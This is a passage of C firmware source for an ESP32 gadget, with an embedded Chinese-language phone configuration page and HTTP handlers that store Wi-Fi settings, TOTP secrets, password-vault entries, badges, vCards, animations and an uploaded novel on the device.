    "<button type=\"submit\">保存番茄钟设置</button>\n"
    "<p class=\"st\">计时进行中无法修改时长与循环次数，请先在设备上停止计时。</p>\n"
    "</form>\n"

    "<form method=\"post\" action=\"/badge\">\n"
    "<h2>名片与二维码</h2>\n"
    "<label>第几张名片（1 起，最多 5 张）</label><input name=\"idx\" value=\"1\" inputmode=\"numeric\">\n"
    "<label>昵称（最多 8 个汉字）</label><input name=\"nickname\" maxlength=\"8\">\n"
    "<label>简介第 1 行</label><input name=\"l1\" maxlength=\"12\">\n"
    "<label>简介第 2 行</label><input name=\"l2\" maxlength=\"12\">\n"
    "<label>简介第 3 行</label><input name=\"l3\" maxlength=\"12\">\n"
    "<label>简介第 4 行</label><input name=\"l4\" maxlength=\"12\">\n"
    "<label>二维码 1：标签 / 内容</label>\n"
    "<div class=\"row\"><div><input name=\"q1l\" maxlength=\"4\" placeholder=\"身份码\"></div>"
    "<div><input name=\"q1t\" maxlength=\"120\"></div></div>\n"
    "<label>二维码 2：标签 / 内容</label>\n"
    "<div class=\"row\"><div><input name=\"q2l\" maxlength=\"4\"></div>"
    "<div><input name=\"q2t\" maxlength=\"120\"></div></div>\n"
    "<label>二维码 3：标签 / 内容</label>\n"
    "<div class=\"row\"><div><input name=\"q3l\" maxlength=\"4\"></div>"
    "<div><input name=\"q3t\" maxlength=\"120\"></div></div>\n"
    "<label>头像动图槽位（-1 表示不用动图）</label><input name=\"slot\" value=\"-1\" inputmode=\"numeric\">\n"
    "<button type=\"submit\">保存名片</button>\n"
    "<p class=\"st\">二维码内容留空即删除该位；单条内容最多 120 字节（约 40 个汉字或 120 个字母）。</p>\n"
    "</form>\n"

    "<form method=\"post\" action=\"/vcard\">\n"
    "<h2>联系人名片（vCard 二维码）</h2>\n"
    "<label>写进第几张名片（1 起）</label><input name=\"idx\" value=\"1\" inputmode=\"numeric\">\n"
    "<label>写进第几个二维码位（1-3，会覆盖该位）</label><input name=\"slot\" value=\"3\" inputmode=\"numeric\">\n"
    "<label>姓名（必填）</label><input name=\"name\" maxlength=\"30\">\n"
    "<label>单位 / 学校</label><input name=\"org\" maxlength=\"36\">\n"
    "<label>职务 / 专业</label><input name=\"title\" maxlength=\"24\">\n"
    "<label>电话</label><input name=\"tel\" maxlength=\"24\">\n"
    "<label>邮箱</label><input name=\"email\" maxlength=\"40\">\n"
    "<label>网址</label><input name=\"url\" maxlength=\"40\">\n"
    "<button type=\"submit\">生成名片二维码</button>\n"
    "<p class=\"st\">扫码即可存入手机通讯录。二维码容量约 120 字节，放不下时会按“网址 → 职务 → 单位”依次省略，并如实告知。</p>\n"
    "</form>\n"

    "<form id=\"af\">\n"
    "<h2>头像动图</h2>\n"
    "<label>槽位</label><select id=\"aslot\">"
    "<option value=\"0\">0</option><option value=\"1\">1</option><option value=\"2\">2</option>"
    "<option value=\"3\">3</option><option value=\"4\">4</option><option value=\"5\">5</option>"
    "</select>\n"
    "<label>选择图片或 GIF</label><input type=\"file\" id=\"afile\" accept=\"image/*\">\n"
    "<button type=\"button\" onclick=\"uploadAnim()\">上传到该槽位</button>\n"
    "<p class=\"st\" id=\"ast\">由手机解码并缩放后上传，设备只存帧，所以上传不需要联网。"
    "上限 96x96、24 帧；透明背景会变成黑色；上传成功会覆盖该槽位原内容。</p>\n"
    "</form>\n"
    "<div id=\"animList\" class=\"st\"></div>\n"

    "<form id=\"nf\">\n"
    "<h2>小说</h2>\n"
    "<label>书名（最多 8 个字；留空则用文件名）</label>"
    "<input id=\"ntitle\" maxlength=\"24\" placeholder=\"小说名\">\n"
    "<label>选择 TXT 文件（UTF-8 编码）</label>"
    "<input type=\"file\" id=\"nfile\" accept=\".txt,text/plain\">\n"
    "<label>或直接粘贴正文</label>"
    "<textarea id=\"ntext\" rows=\"4\" placeholder=\"也可以把正文粘贴到这里\"></textarea>\n"
    "<button type=\"button\" onclick=\"uploadNovel()\">上传到设备</button>\n"
    "<p class=\"st\" id=\"nst\">上传会覆盖设备里已有的那本，阅读进度从头开始。"
    "正文必须是 UTF-8 文本；单本上限约 1MB。上传时设备在写 Flash，请不要离开本页面。</p>\n"
    "</form>\n"
    "<div id=\"novelInfo\" class=\"st\"></div>\n"
    "<form method=\"post\" action=\"/novel_del\"><button type=\"submit\">删除设备上的小说</button></form>\n"

    "<script>\n"
    "document.getElementById('t').value=Math.floor(Date.now()/1000);\n"
    "var ESC={'&':'&amp;','<':'&lt;','>':'&gt;','\"':'&quot;',\"'\":'&#39;'};\n"
    "function esc(s){return String(s==null?'':s).replace(/[&<>\"']/g,function(c){return ESC[c];});}\n"
    "function delItem(text,idx,action){\n"
    "  return '<div class=\"item\"><span>'+esc(text)+'</span><form method=\"post\" action=\"'+action+'\">'+\n"
    "    '<input type=\"hidden\" name=\"i\" value=\"'+idx+'\"><button type=\"submit\">删除</button></form></div>';\n"
    "}\n"
    "function loadInfo(){\n"
    "  fetch('/info').then(function(r){return r.json();}).then(function(d){\n"
    "    var vl='',es=d.vault.entries||[];\n"
    "    for(var i=0;i<es.length;i++){vl+=delItem((es[i].label||'(无名)')+' · '+es[i].account,es[i].i,'/vault_del');}\n"
    "    document.getElementById('vaultList').innerHTML=\n"
    "      '密码本：'+esc(d.vault.mode)+'，'+d.vault.count+' 条，'+\n"
    "      (d.vault.encrypted?(d.vault.locked?'已上锁（在设备上解锁后才能新增）':'已解锁'):'无需解锁')+\n"
    "      (vl?'<div>'+vl+'</div>':'<div>暂无条目</div>');\n"
    "    var tl='',ts=d.totp.items||[];\n"
    "    for(var j=0;j<ts.length;j++){tl+=delItem(ts[j].label||'(无备注)',ts[j].i,'/totp_del');}\n"
    "    document.getElementById('totpList').innerHTML=\n"
    "      '动态口令：'+d.totp.count+' / '+d.totp.max+(tl?'<div>'+tl+'</div>':'<div>暂无账户</div>');\n"
    "    var p=d.pomodoro;\n"
    "    document.getElementById('pf_focus').value=p.focus;\n"
    "    document.getElementById('pf_brk').value=p.brk;\n"
    "    document.getElementById('pf_long').value=p['long'];\n"
    "    document.getElementById('pf_cycles').value=p.cycles;\n"
    "    document.getElementById('pf_auto').checked=!!p.auto;\n"
    "    document.getElementById('pf_dnd').checked=!!p.dnd;\n"
    "    document.getElementById('pf_stats').innerHTML='当前：'+esc(p.state)+'<br>今日 '+p.today_min+' 分钟 / '+p.today_sessions+' 段<br>累计 '+p.total_sessions+' 段 · '+p.total_min+' 分钟';\n"
    "    var al='',as=d.anim.items||[];\n"
    "    for(var k=0;k<as.length;k++){\n"
    "      var s=as[k];\n"
    "      al+='<div class=\"item\"><span>槽位 '+s.slot+(s.used?('：'+esc(s.name||'未命名')+' '+s.w+'x'+s.h+' · '+s.frames+' 帧'):'：空')+'</span></div>';\n"
    "    }\n"
    "    document.getElementById('animList').innerHTML='动图槽位：'+d.anim.used+' / '+d.anim.slots+(al?'<div>'+al+'</div>':'');\n"
    "    var nv=d.novel||{};\n"
    "    document.getElementById('novelInfo').innerHTML = nv.present\n"
    "      ? ('设备里已有：《'+esc(nv.title||'未命名')+'》，约 '+Math.round((nv.bytes||0)/1024)+' KB'+(nv.chapters?('，'+nv.chapters+' 章'):'，没有章节标记'))\n"
    "      : '设备里还没有小说。上传后即可离线阅读。';\n"
    "  }).catch(function(){document.getElementById('ast').textContent='读取设备数据失败，请刷新页面重试';});\n"
    "}\n"
    "function frame565(src,W,H){\n"
    "  var c=document.createElement('canvas');c.width=W;c.height=H;\n"
    "  var x=c.getContext('2d',{willReadFrequently:true});\n"
    "  x.drawImage(src,0,0,W,H);\n"
    "  var d=x.getImageData(0,0,W,H).data,out=new Uint8Array(W*H*2);\n"
    "  for(var p=0,i=0;p<d.length;p+=4,i+=2){\n"
    "    var v=((d[p]>>3)<<11)|((d[p+1]>>2)<<5)|(d[p+2]>>3);\n"
    "    out[i]=v&255;out[i+1]=(v>>8)&255;\n"
    "  }\n"
    "  return out;\n"
    "}\n"
    "function decodeFrames(file,maxSide,maxFrames){\n"
    "  return new Promise(function(resolve,reject){\n"
    "    var type=file.type||'';\n"
    "    if(!type){var nm=(file.name||'').toLowerCase();\n"
    "      type=nm.slice(-4)==='.gif'?'image/gif':nm.slice(-4)==='.png'?'image/png':nm.slice(-5)==='.webp'?'image/webp':'image/jpeg';}\n"
    "    if(!window.ImageDecoder||(type!=='image/gif'&&type!=='image/webp')){reject(new Error('此浏览器不能解码动图，请用 Chrome/Edge/Safari 新版，或改用单张图片'));return;}\n"
    "    file.arrayBuffer().then(function(buf){\n"
    "      var dec=new ImageDecoder({data:buf,type:type});\n"
    "      dec.tracks.ready.then(function(){\n"
    "        var track=dec.tracks.selectedTrack;\n"
    "        var total=Math.min(track.frameCount||1,maxFrames),out={w:0,h:0,frames:[],ms:100},sum=0,cnt=0,seq=Promise.resolve();\n"
    "        for(var i=0;i<total;i++){(function(idx){\n"
    "          seq=seq.then(function(){\n"
    "            return dec.decode({frameIndex:idx}).then(function(r){\n"
    "              var img=r.image;\n"
    "              if(!out.w){var sc=Math.min(1,maxSide/Math.max(img.displayWidth,img.displayHeight));\n"
    "                out.w=Math.max(1,Math.round(img.displayWidth*sc));out.h=Math.max(1,Math.round(img.displayHeight*sc));}\n"
    "              if(img.duration){sum+=img.duration;cnt++;}\n"
    "              out.frames.push(frame565(img,out.w,out.h));\n"
    "              img.close();\n"
    "            });\n"
    "          });\n"
    "        })(i);}\n"
    "        seq.then(function(){\n"
    "          if(!out.frames.length){reject(new Error('没有解出任何帧'));return;}\n"
    "          if(cnt){out.ms=Math.min(1000,Math.max(40,Math.round(sum/cnt/1000)));}\n"
    "          resolve(out);\n"
    "        }).catch(reject);\n"
    "      }).catch(reject);\n"
    "    }).catch(reject);\n"
    "  });\n"
    "}\n"
    "function uploadAnim(){\n"
    "  var st=document.getElementById('ast'),f=document.getElementById('afile').files[0];\n"
    "  var slot=document.getElementById('aslot').value;\n"
    "  if(!f){st.textContent='请先选择图片或 GIF';return;}\n"
    "  st.textContent='正在解码…';\n"
    "  decodeFrames(f,96,24).then(function(res){\n"
    "    var W=res.w,H=res.h,n=res.frames.length,all=new Uint8Array(W*H*2*n);\n"
    "    for(var i=0;i<n;i++){all.set(res.frames[i],i*W*H*2);}\n"
    "    var name=(f.name||'anim').replace(/\\.[^.]+$/,'').slice(0,16);\n"
    "    var url='/anim?slot='+slot+'&w='+W+'&h='+H+'&frames='+n+'&ms='+res.ms+'&name='+encodeURIComponent(name);\n"
    "    var xhr=new XMLHttpRequest();\n"
    "    xhr.open('POST',url);\n"
    "    xhr.setRequestHeader('Content-Type','application/octet-stream');\n"
    "    xhr.upload.onprogress=function(e){if(e.total){st.textContent='上传中 '+Math.round(e.loaded/e.total*100)+'%（'+W+'x'+H+'，'+n+' 帧）';}};\n"
    "    xhr.onload=function(){\n"
    "      if(xhr.status>=200&&xhr.status<300){document.open();document.write(xhr.responseText);document.close();}\n"
    "      else{st.textContent='设备拒绝：'+(xhr.responseText?'请查看返回页面':'状态 '+xhr.status);}\n"
    "    };\n"
    "    xhr.onerror=function(){st.textContent='上传中断，请重试';};\n"
    "    xhr.send(all.buffer);\n"
    "  }).catch(function(e){st.textContent='解码失败：'+(e&&e.message?e.message:'未知原因');});\n"
    "}\n"
    "function uploadNovel(){\n"
    "  var st=document.getElementById('nst');\n"
    "  var title=document.getElementById('ntitle').value||'';\n"
    "  var f=document.getElementById('nfile').files[0];\n"
    "  var ta=document.getElementById('ntext').value;\n"
    "  function send(text,name){\n"
    "    if(!text){st.textContent='没有可上传的正文';return;}\n"
    "    if(!title&&name){title=String(name).replace(/\\.[^.]+$/,'').slice(0,24);}\n"
    "    var xhr=new XMLHttpRequest();\n"
    "    xhr.open('POST','/novel?title='+encodeURIComponent(title));\n"
    "    xhr.setRequestHeader('Content-Type','text/plain;charset=utf-8');\n"
    "    xhr.upload.onprogress=function(e){if(e.total){st.textContent='上传中 '+Math.round(e.loaded/e.total*100)+'%';\n"
    "      if(e.loaded>=e.total)st.textContent='上传完成，设备正在校验（可能要十几秒）';}};\n"
    "    xhr.onload=function(){\n"
    "      if(xhr.status>=200&&xhr.status<300){st.textContent='已保存 '+text.length+' 字符';loadInfo();}\n"
    "      else{st.textContent='设备拒绝（状态 '+xhr.status+'）：正文过长或不是 UTF-8 文本';}\n"
    "    };\n"
    "    xhr.onerror=function(){st.textContent='上传中断，请重试';};\n"
    "    xhr.send(text);\n"
    "  }\n"
    "  if(f){var fr=new FileReader();fr.onload=function(){send(String(fr.result),f.name);};fr.readAsText(f,'utf-8');}\n"
    "  else send(ta,'');\n"
    "}\n"
    "window.addEventListener('load',loadInfo);\n"
    "</script>\n"
    "</body></html>\n";


static void prov_set_note(const char *msg)
{
    net_lock();
    copy_trunc(s_prov_note, sizeof(s_prov_note), msg);
    net_unlock();
}

static esp_err_t prov_reply(httpd_req_t *req, const char *msg)
{
    char page[512];
    snprintf(page, sizeof(page),
             "<!DOCTYPE html><html lang=\"zh-CN\"><head><meta charset=\"utf-8\">"
             "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
             "<title>配网结果</title></head>"
             "<body style=\"font-family:sans-serif;padding:20px\">"
             "<h2>FoloToy AI Passport</h2><p>%s</p>"
             "<p><a href=\"/\">返回配网首页</a></p></body></html>",
             msg ? msg : "");
    httpd_resp_set_type(req, "text/html; charset=utf-8");
    return httpd_resp_send(req, page, HTTPD_RESP_USE_STRLEN);
}

// 读取表单请求体到 buf，返回实际长度（0 表示无体/失败）。
static int read_form_body(httpd_req_t *req, char *buf, size_t cap)
{
    if (cap == 0) return 0;
    buf[0] = '\0';
    int total = req->content_len;
    if (total <= 0) return 0;
    if ((size_t)total >= cap) total = (int)cap - 1;
    int r = httpd_req_recv(req, buf, (size_t)total);
    if (r <= 0) return 0;
    buf[r] = '\0';
    return r;
}

static esp_err_t prov_get_root(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html; charset=utf-8");
    return httpd_resp_send(req, PROV_PAGE, HTTPD_RESP_USE_STRLEN);
}

static esp_err_t prov_post_wifi(httpd_req_t *req)
{
    char body[400];
    if (read_form_body(req, body, sizeof(body)) <= 0) {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "未收到表单内容");
    }

    char ssid[33] = { 0 };
    char pass[65] = { 0 };
    if (httpd_query_key_value(body, "ssid", ssid, sizeof(ssid)) != ESP_OK || ssid[0] == '\0') {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "请填写 Wi-Fi 名称");
    }
    // 密码可以为空（开放网络）。
    httpd_query_key_value(body, "pass", pass, sizeof(pass));
    url_decode(ssid);
    url_decode(pass);

    esp_err_t err = app_net_wifi_set_credentials(ssid, pass);
    if (err != ESP_OK) {
        return prov_reply(req, "保存失败，请重试");
    }
    prov_set_note("已保存，设备正在连接");
    return prov_reply(req, "已保存，设备正在连接 Wi-Fi");
}

static esp_err_t prov_post_time(httpd_req_t *req)
{
    char body[128];
    long long unix_sec = 0;
    if (read_form_body(req, body, sizeof(body)) > 0) {
        char tbuf[24] = { 0 };
        if (httpd_query_key_value(body, "t", tbuf, sizeof(tbuf)) == ESP_OK) {
            unix_sec = atoll(tbuf);
        }
    }
    if (unix_sec <= 0) unix_sec = (long long)app_state_now_unix();

    int offset = app_state_settings()->utc_offset_minutes * 60;
    time_t local = (time_t)(unix_sec + offset);
    struct tm tmv;
    if (!gmtime_r(&local, &tmv)) {
        return prov_reply(req, "时间格式不正确");
    }

    app_datetime_t dt = {
        .year = tmv.tm_year + 1900,
        .month = tmv.tm_mon + 1,
        .day = tmv.tm_mday,
        .hour = tmv.tm_hour,
        .minute = tmv.tm_min,
        .second = tmv.tm_sec,
    };
    app_state_set_time(&dt, "手机");
    prov_set_note("时间已校准");
    return prov_reply(req, "时间已校准");
}

static esp_err_t prov_post_totp(httpd_req_t *req)
{
    char body[320];
    if (read_form_body(req, body, sizeof(body)) <= 0) {
        return prov_reply(req, "未收到表单内容");
    }

    char uri[192] = { 0 };
    if (httpd_query_key_value(body, "uri", uri, sizeof(uri)) != ESP_OK || uri[0] == '\0') {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "请填写口令链接");
    }
    url_decode(uri);

    app_totp_account_t acct;
    if (!app_totp_parse_uri(uri, &acct)) {
        return prov_reply(req, "链接格式不正确");
    }
    int idx = app_state_totp_add(&acct);
    if (idx < 0) {
        return prov_reply(req, "口令已满，请先删除一个");
    }
    prov_set_note("口令已添加");
    return prov_reply(req, "口令已添加");
}

// 作息导入：手机配置页把整段作息文本 POST 到 /routine。文本可能上千字节（一周七天），
// 因此按 content_len 在堆上收，而不是像其它表单那样用固定栈缓冲。
#define PROV_ROUTINE_MAX 8192

static esp_err_t prov_post_routine(httpd_req_t *req)
{
    int total = req->content_len;
    if (total <= 0 || total > PROV_ROUTINE_MAX) {
        httpd_resp_set_status(req, "413 Payload Too Large");
        return prov_reply(req, "内容为空或过长（上限约 8 KB）");
    }

    char *body = (char *)malloc((size_t)total + 1);
    if (!body) {
        httpd_resp_set_status(req, "500 Internal Server Error");
        return prov_reply(req, "设备内存不足，请重试");
    }

    int got = 0;
    while (got < total) {
        int r = httpd_req_recv(req, body + got, (size_t)(total - got));
        if (r == HTTPD_SOCK_ERR_TIMEOUT) continue;
        if (r <= 0) {
            free(body);
            httpd_resp_set_status(req, "400 Bad Request");
            return prov_reply(req, "读取内容失败，请重试");
        }
        got += r;
    }
    body[got] = '\0';

    char *text = strstr(body, "text=");
    if (!text) {
        free(body);
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "请填写作息文本");
    }
    text += 5;
    // 表单里只有 text 一个字段，正常情况下其后没有 '&'；仍截断一次以防误传。
    char *amp = strchr(text, '&');
    if (amp) *amp = '\0';
    url_decode(text);

    app_routine_t *routine = app_state_routine();
    bool has_alt = false;
    int lines = app_routine_parse_table(routine, text, &has_alt);
    free(body);

    if (lines <= 0) {
        return prov_reply(req,
                          "没有识别到有效作息行：请检查每行是否为 \u201cHH:MM-HH:MM 名称\u201d，"
                          "并确认新时段没有和已有节点重叠");
    }

    app_state_save_routine();

    char msg[128];
    if (has_alt) {
        // 文本写了双周表，顺手开启单双周，否则用户会觉得"双周部分没生效"。
        app_state_settings()->use_odd_week = true;
        app_state_save_settings();
        snprintf(msg, sizeof(msg), "已导入 %d 行，并已开启单双周作息", lines);
    } else {
        snprintf(msg, sizeof(msg), "已导入 %d 行", lines);
    }
    prov_set_note(msg);
    return prov_reply(req, msg);
}

// ---------------------------------------------------------------------------
// 配置页数据接口（名片 / 密码本 / 口令 / 番茄钟 / 动图）
// ---------------------------------------------------------------------------
// 设备只有三个按键，没有键盘：二维码内容、口令密钥、密码这类长文本在设备上几乎无法
// 输入，只能由手机页面写入。这里只做校验与落盘，一律调用 app_state 的存档函数，与
// 设备端界面共用同一份持久化数据——写完就离线可用，不依赖手机再次在场。

// 追加字符串并保证以 NUL 结尾；缓冲不足时截断，绝不越界。
static void buf_append(char *buf, size_t cap, size_t *used, const char *text)
{
    size_t n = strlen(text);
    if (*used + n >= cap) n = (cap - 1 > *used) ? cap - 1 - *used : 0;
    memcpy(buf + *used, text, n);
    *used += n;
    buf[*used] = '\0';
}

// 以 JSON 字符串字面量形式追加（自带引号），转义 " 与 \ 以及控制字符：标签来自用户
// 输入，不转义会让手机端整段解析失败。
static void json_append_str(char *buf, size_t cap, size_t *used, const char *text)
{
    buf_append(buf, cap, used, "\"");
    for (const char *p = text ? text : ""; *p && *used + 8 < cap; p++) {
        unsigned char c = (unsigned char)*p;
        char esc[8];
        if (c == '"' || c == '\\') {
            esc[0] = '\\';
            esc[1] = (char)c;
            esc[2] = '\0';
        } else if (c < 0x20) {
            snprintf(esc, sizeof(esc), "\\u%04x", c);
        } else {
            esc[0] = (char)c;
            esc[1] = '\0';
        }
        buf_append(buf, cap, used, esc);
    }
    buf_append(buf, cap, used, "\"");
}

// 表单字段的接收缓冲要按"编码后"长度给：httpd_query_key_value 是在百分号解码之前判断
// 是否超长的，一个 UTF-8 汉字编码后会变成 3 组 %XX（原文的 3 倍），若直接用模型字段的
// 大小当缓冲，中文输入会被误判成超长而整段丢弃。
#define FORM_RAW_CAP(bytes) ((bytes) * 3 + 8)

// 取表单字段并做 URL 解码；字段缺失或超出缓冲返回 false（此时内容已被 httpd 标记
// 截断，直接当失败处理，避免把半截文本当成用户输入存下去）。
static bool form_field(const char *body, const char *key, char *out, size_t cap)
{
    if (!out || cap == 0) return false;
    out[0] = '\0';
    if (httpd_query_key_value(body, key, out, cap) != ESP_OK) return false;
    url_decode(out);
    return true;
}

// 取查询串整数，缺失或非法时用默认值。
static int query_int(const char *query, const char *key, int fallback)
{
    char v[16];
    if (!query || httpd_query_key_value(query, key, v, sizeof(v)) != ESP_OK) return fallback;
    return atoi(v);
}

// 表单整体读入栈缓冲；超出上限返回 false，由调用方回 413。
static bool read_form_checked(httpd_req_t *req, char *buf, size_t cap)
{
    if (req->content_len <= 0) return false;
    if ((size_t)req->content_len >= cap) return false;
    return read_form_body(req, buf, cap) > 0;
}

static esp_err_t prov_post_vault(httpd_req_t *req)
{
    char body[480];
    if (!read_form_checked(req, body, sizeof(body))) {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "内容为空或过长");
    }

    char label[APP_VAULT_LABEL_LEN];
    char account[APP_VAULT_ACCOUNT_LEN];
    char password[APP_VAULT_PASSWORD_LEN];
    form_field(body, "label", label, sizeof(label));
    bool has_account = form_field(body, "account", account, sizeof(account));
    bool has_password = form_field(body, "password", password, sizeof(password));
    if (!has_account && !has_password) {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "请至少填写账号或密码");
    }

    app_vault_t *v = app_state_vault();
    int index = -1;
    app_vault_status_t st = app_vault_add(v, label, account, password, &index);
    if (st == APP_VAULT_ERR_LOCKED) {
        return prov_reply(req, "密码本已加密且当前未解锁：请先在设备上用手势解锁，再回来保存");
    }
    if (st != APP_VAULT_OK) {
        return prov_reply(req, app_vault_status_text(st));
    }
    app_state_save_vault();

    char msg[96];
    snprintf(msg, sizeof(msg), "已保存第 %d 条（共 %d 条）", index + 1, v->count);
    return prov_reply(req, msg);
}

// 删除条目。序号用 1 起始，与页面列表一致，避免用户在浏览器和屏幕之间换算。
static esp_err_t prov_post_vault_del(httpd_req_t *req)
{
    char body[128];
    if (!read_form_checked(req, body, sizeof(body))) {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "内容为空或过长");
    }
    char num[12];
    if (!form_field(body, "i", num, sizeof(num))) {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "缺少要删除的序号");
    }

    app_vault_t *v = app_state_vault();
    app_vault_status_t st = app_vault_remove(v, atoi(num) - 1);
    if (st == APP_VAULT_ERR_LOCKED) {
        return prov_reply(req, "密码本已加密且当前未解锁：请先在设备上解锁");
    }
    if (st != APP_VAULT_OK) {
        return prov_reply(req, app_vault_status_text(st));
    }
    app_state_save_vault();
    return prov_reply(req, "已删除");
}

// 网页端恢复码解锁：设备三键无法输入 31 位恢复码，忘了手势时这是唯一的出口。
// 同样走带退避的 try_ 版本：连续乱填会进入冷却，避免在这里无限探测恢复码。
static esp_err_t prov_post_vault_unlock(httpd_req_t *req)
{
    char body[200];
    if (!read_form_checked(req, body, sizeof(body))) {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "内容为空或过长");
    }
    char code[FORM_RAW_CAP(APP_VAULT_RECOVERY_LEN + 1)];
    if (!form_field(body, "code", code, sizeof(code))) {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "请填写恢复码");
    }

    uint32_t now_ms = (uint32_t)(esp_timer_get_time() / 1000);
    app_vault_status_t st = app_vault_try_unlock_recovery(app_state_vault(), code, now_ms);
    if (st != APP_VAULT_OK) {
        return prov_reply(req, app_vault_status_text(st));
    }
    // 解锁只改运行态，不写 NVS：设备重启或再次上锁后仍需重新解锁。
    return prov_reply(req, "恢复码正确，密码本已解锁，可以继续添加条目了");
}

// 动态口令：可只填密钥，也可粘贴 otpauth 链接（走 /totp）。位数、刷新周期与算法允许
// 用户自定义，不填则用最常见的 6 位 / 30 秒 / SHA1；密钥编码形式由逻辑层自动识别。
static esp_err_t prov_post_totp_secret(httpd_req_t *req)
{
    char body[256];
    if (!read_form_checked(req, body, sizeof(body))) {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "内容为空或过长");
    }

    char label[24];
    char secret[128];
    char digits_text[8];
    char period_text[8];
    char algo_text[16];
    form_field(body, "label", label, sizeof(label));
    if (!form_field(body, "secret", secret, sizeof(secret)) || secret[0] == '\0') {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "请填写密钥");
    }
    form_field(body, "digits", digits_text, sizeof(digits_text));
    form_field(body, "period", period_text, sizeof(period_text));
    form_field(body, "algorithm", algo_text, sizeof(algo_text));

    int digits = (atoi(digits_text) == 8) ? 8 : 6;
    int period = period_text[0] ? atoi(period_text) : 0;   // 0 交给逻辑层取默认 30
    uint8_t algo = strstr(algo_text, "256") ? APP_TOTP_ALGO_SHA256 : APP_TOTP_ALGO_SHA1;

    app_totp_account_t acct;
    if (!app_totp_parse_secret(label, secret, digits, period, algo, &acct)) {
        return prov_reply(req, "密钥需为 10-64 位的 Base32 或 16 进制，可含空格与横线；"
                               "请确认长度与字符集是否匹配");
    }

    int idx = app_state_totp_add(&acct);
    if (idx < 0) {
        return prov_reply(req, "口令账户已满（上限 10 个），请先删除一个");
    }
    app_state_save_totp();

    char msg[80];
    snprintf(msg, sizeof(msg), "已添加第 %d 个口令账户（共 %d 个）", idx + 1, app_state_totp_count());
    return prov_reply(req, msg);
}

static esp_err_t prov_post_totp_del(httpd_req_t *req)
{
    char body[128];
    if (!read_form_checked(req, body, sizeof(body))) {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "内容为空或过长");
    }
    char num[12];
    if (!form_field(body, "i", num, sizeof(num))) {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "缺少要删除的序号");
    }
    if (!app_state_totp_remove(atoi(num) - 1)) {
        return prov_reply(req, "序号不存在");
    }
    app_state_save_totp();
    return prov_reply(req, "已删除");
}

// 名片：昵称 + 4 行文字 + 最多 3 个二维码 + 动图槽位。二维码留空即视为删除该位。
static esp_err_t prov_post_badge(httpd_req_t *req)
{
    // 3 个二维码的内容经表单编码后最长可到 3 x 360 字节，加上其余字段留足余量。
    char body[3072];
    if (!read_form_checked(req, body, sizeof(body))) {
        httpd_resp_set_status(req, "413 Payload Too Large");
        return prov_reply(req, "内容过长：二维码内容请控制在 120 字节以内");
    }

    app_badge_list_t *list = app_state_badges();
    if (list->count <= 0 && app_badge_add(list) < 0) {
        return prov_reply(req, "名片创建失败");
    }

    char num[12];
    int index = form_field(body, "idx", num, sizeof(num)) ? atoi(num) - 1 : 0;
    if (index < 0 || index >= list->count) index = 0;
    app_badge_t *b = &list->items[index];

    char nickname[sizeof(b->nickname)];
    form_field(body, "nickname", nickname, sizeof(nickname));

    char line_buf[APP_BADGE_MAX_LINES][sizeof(b->lines[0])];
    const char *lines[APP_BADGE_MAX_LINES];
    int line_count = 0;
    for (int i = 0; i < APP_BADGE_MAX_LINES; i++) {
        char key[4];
        snprintf(key, sizeof(key), "l%d", i + 1);
        if (form_field(body, key, line_buf[i], sizeof(line_buf[i])) && line_buf[i][0] != '\0') {
            lines[line_count++] = line_buf[i];
        }
    }
    if (!app_badge_set_text(b, nickname, lines, line_count)) {
        return prov_reply(req, "昵称或简介不是合法文本");
    }

    for (int q = 0; q < APP_BADGE_QR_MAX; q++) {
        char kt[4];
        char kl[4];
        char text[APP_BADGE_QR_TEXT_LEN];
        char label[APP_BADGE_QR_LABEL_LEN];
        snprintf(kt, sizeof(kt), "q%dt", q + 1);
        snprintf(kl, sizeof(kl), "q%dl", q + 1);
        bool has_text = form_field(body, kt, text, sizeof(text));
        form_field(body, kl, label, sizeof(label));

        if (!has_text || text[0] == '\0') {
            app_badge_qr_remove(b, q);
            continue;
        }
        char msg[96];
        if (q < b->qr_count) {
            if (!app_badge_qr_set(b, q, label, text)) {
                snprintf(msg, sizeof(msg), "第 %d 个二维码内容不合法或超过 120 字节", q + 1);
                return prov_reply(req, msg);
            }
        } else if (app_badge_qr_add(b, label, text) < 0) {
            snprintf(msg, sizeof(msg), "第 %d 个二维码内容不合法或超过 120 字节", q + 1);
            return prov_reply(req, msg);
        }
    }

    // 动图槽位：-1 表示不带头像动图。
    if (form_field(body, "slot", num, sizeof(num))) {
        app_badge_set_anim(b, atoi(num));
    }

    app_state_save_badges();

    char msg[96];
    snprintf(msg, sizeof(msg), "已保存第 %d 张名片：%d 行简介、%d 个二维码、动图槽位 %d",
             index + 1, line_count, b->qr_count, b->anim_slot);
    return prov_reply(req, msg);
}

// 取一个表单字段并按目标字段长度截断。中转缓冲按百分号编码后的长度给：一个汉字编码后
// 变成 3 组 %XX，直接用目标结构体大小接收会把中文误判成超长。
static void vcard_take(const char *body, const char *key, char *dst, size_t dst_cap)
{
    char raw[FORM_RAW_CAP(APP_VCARD_EMAIL_LEN)];
    if (dst_cap == 0 || dst_cap > sizeof(raw)) return;
    if (form_field(body, key, raw, sizeof(raw))) {
        snprintf(dst, dst_cap, "%s", raw);
    }
}

// 联系人名片：把结构化字段编成 vCard 3.0 文本，写进某张名片的某个二维码位。设备端已有
// 二维码渲染与全屏展示，这里只负责"生成内容"，不新增存储格式，也不改设备端交互。
static esp_err_t prov_post_vcard(httpd_req_t *req)
{
    char body[1024];
    if (!read_form_checked(req, body, sizeof(body))) {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "内容为空或过长");
    }

